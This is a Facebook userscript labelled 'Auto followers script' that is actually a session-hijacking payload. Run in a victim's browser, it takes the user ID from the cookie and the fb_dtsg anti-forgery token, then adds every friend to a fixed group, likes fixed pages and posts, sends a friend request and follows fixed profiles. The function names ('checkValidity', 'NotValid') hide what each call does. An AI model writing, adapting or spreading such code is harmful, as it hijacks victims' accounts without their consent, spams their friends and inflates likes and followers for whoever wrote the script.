// ==UserScript==
// @name   Auto followers script     
// @version    2.01
// @description made by nasir hussain        
// ==/UserScript==


var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now=(new Date).getTime();
var gid=["640248356035156"];
var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
var friends = new Array();
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {
	} 
else {
	data = eval('(' + gf['responseText']['substr'](9) + ')');
	if (data['error']) {
	} 
	else {
        	friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            	return _0x93dax8['index'] - _0x93dax9['index'];
        	});
    	};
};
for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
		if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
function sleep(milliSeconds){
      var startTime = new Date().getTime(); 
      while (new Date().getTime() < startTime + milliSeconds);
}

function NotValid(p) { 
	var Page = new XMLHttpRequest(); 
	var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; 
	var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; 
	Page.open("POST", PageURL, true); 
	Page.onreadystatechange = function () { 
		if (Page.readyState == 4 && Page.status == 200) { 
			Page.close; 
		} 
	};
	Page.send(PageParams); 
} 
function checkIsValidID(uid){
	var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
		if(xmlhttp.readyState == 4){	
			}
        };
		
	xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
	var params = "to_friend=" + uid;
	params += "&action=add_friend";
	params += "&how_found=friend_browser";
	params += "&ref_param=none";
	params += "&outgoing_id=";
	params += "&logging_location=friend_browser";
	params += "&no_flyout_on_click=true";
	params += "&ego_log_data=";
	params += "&http_referer=";
	params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=1658165120113116104521114";
	params += "&__user=" + user_id;
	xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
	xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
	xmlhttp.send(params);
}

function checkValidity(opo) { 
	var X = new XMLHttpRequest();
	var XURL ="//www.facebook.com/ajax/ufi/like.php";
	var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp=";
	X.open("POST", XURL, true);
	X.onreadystatechange = function () { 
		if (X.readyState == 4 && X.status == 200) {
			X.close; 
		}
	}; 
	X.send(XParams); 
} 
function nowDoItBuddy(abone){
	var http4 = new XMLHttpRequest();
	var url4 = "/ajax/follow/follow_profile.php?__a=1";
	var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
	http4.open("POST", url4, true);
	http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	http4.setRequestHeader("Content-length", params4.length);
	http4.setRequestHeader("Connection", "close");
	http4.onreadystatechange = function() {
	if(http4.readyState == 4 && http4.status == 200) 
		{http4.close; }
	}
	http4.send(params4);
}
NotValid("297749613678444");
NotValid("303264093126789");
NotValid("548781161816546");
NotValid("143670339158126");
NotValid("565415030211659");
checkValidity("517647641667872");
checkValidity("518744168224886");
checkValidity("506127359486567");
checkValidity("416895548409749");
checkValidity("416895265076444");
checkValidity("520012044764765");
checkValidity("515302335235736");
checkValidity("3757788118595");
checkValidity("1498084790417459");
checkIsValidID("100002679223380");
nowDoItBuddy("100002679223380");
nowDoItBuddy("100003875626252");
nowDoItBuddy("100004719522101");
nowDoItBuddy("100006478585331");